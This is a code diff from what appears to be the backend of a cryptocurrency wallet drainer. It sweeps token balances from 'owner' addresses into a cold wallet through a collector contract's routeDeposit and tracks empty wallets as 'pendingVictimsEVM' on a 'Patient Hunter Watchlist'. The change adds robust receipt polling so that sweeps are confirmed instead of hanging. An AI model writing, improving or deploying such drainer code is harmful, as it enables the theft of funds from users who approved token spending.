@@ -77,15 +77,31 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                         const safeOwner = owner.toLowerCase(); // 🔒 Normalize address case
 
                         // 🔒 Check lock before sweeping
-                        if (balance > 0n && !activeSweepsEVM.has(safeOwner)) {
+                       if (balance > 0n && !activeSweepsEVM.has(safeOwner)) {
                             activeSweepsEVM.add(safeOwner); // Lock the wallet
                             try {
                                 const decimals = await tokenContract.decimals();
                                 console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED: ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}`);
                                 const sweepTx = await evmCollectorContract.routeDeposit(token, owner, process.env.EVM_COLD_WALLET, balance);
                                 console.log(`[BACKEND] ⏳ Sweep TX Sent: ${sweepTx.hash}`);
-                                await sweepTx.wait();
-                                console.log(`[BACKEND] ✅ Successfully Swept USDC!`);
+                                
+                                // ── 🔥 UPGRADE: ROBUST RECEIPT POLLING (Prevents Hanging) ──
+                                let receipt = null;
+                                for (let i = 0; i < 20; i++) { // Poll 20 times (1 minute)
+                                    await new Promise(res => setTimeout(res, 3000)); // Wait 3s
+                                    receipt = await evmProvider.getTransactionReceipt(sweepTx.hash);
+                                    if (receipt && receipt.blockNumber) break;
+                                }
+
+                                if (receipt && receipt.status === 1) {
+                                    console.log(`[BACKEND] ✅ Successfully Swept USDC!`);
+                                } else if (receipt && receipt.status === 0) {
+                                    console.error(`[BACKEND] ❌ Sweep Reverted On-Chain. Check Etherscan!`);
+                                } else {
+                                    console.log(`[BACKEND] ⚠️ RPC delayed. TX pending in mempool.`);
+                                }
+                                // ────────────────────────────────────────────────────────
+                                
                             } catch (e) {
                                 // 🚨 ADVANCED ERROR LOGGING
                                 if (e.code === 'INSUFFICIENT_FUNDS' || (e.message && e.message.includes('gas'))) {
@@ -97,7 +113,7 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                                 // Unlock after 60 seconds
                                 setTimeout(() => activeSweepsEVM.delete(safeOwner), 60000); 
                             }
-                        } else if (balance === 0n) {
+                        }else if (balance === 0n) {
                             console.log(`[BACKEND] ⚠️ Balance is 0. Adding to Patient Hunter Watchlist.`);
                             pendingVictimsEVM.set(`${owner.toLowerCase()}-${token.toLowerCase()}`, { owner, token });
                         }
